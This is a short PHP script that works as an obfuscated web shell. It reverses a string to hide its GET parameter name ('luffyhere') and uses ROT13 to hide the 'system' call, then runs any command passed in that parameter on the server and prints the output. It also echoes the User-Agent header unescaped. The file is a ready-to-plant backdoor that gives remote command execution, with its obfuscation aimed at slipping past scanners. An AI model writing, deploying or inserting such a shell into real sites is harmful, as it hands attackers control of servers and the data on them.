<?php
try {
    // Reverse the string 'luffyhere' to get the command parameter name
    $cmd = strrev("erehyfful");
    // Get the user input from the GET request
    if (!isset($_GET[$cmd])) {
        throw new Exception("Input parameter not provided! <a>");
    }


    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    echo "User-Agent: $userAgent\n";

    $input = $_GET[$cmd];

    // Obfuscated 'system' function
    $execute = str_rot13('flfgrz');

    // Check if the input is safe to run as a system command (Basic check, more filtering needed in real-world applications)
    if (empty($input)) {
        throw new Exception("No input provided to execute.");
    }

    // Execute the command
    $output = $execute($input);

    // Optionally capture and display output (system prints by default)
    echo $output;

} catch (Exception $e) {
    // Catch any exceptions and display the error message
    echo 'Caught exception: ',  $e->getMessage(), "\n";
} catch (Error $err) {
    // This handles fatal errors in PHP 7+
    echo 'Caught fatal error: ', $err->getMessage(), "\n";
}
?>
